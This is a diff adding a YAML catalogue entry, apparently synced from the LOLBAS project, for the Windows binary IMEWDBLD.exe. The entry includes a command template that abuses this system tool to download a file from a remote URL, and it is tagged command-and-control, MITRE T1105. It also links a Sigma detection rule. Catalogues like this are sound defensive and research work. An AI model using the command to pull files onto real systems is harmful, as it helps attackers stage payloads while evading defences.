@@ -1,0 +1,30 @@
+id: lolbas/imewdbld/download/0
+type: binary
+platform: windows
+name: IMEWDBLD.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
+commands:
+- template: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
+  comment: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will
+    download the file served at by that URL and save it to INetCache.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
+tags:
+- windows
+- lolbas
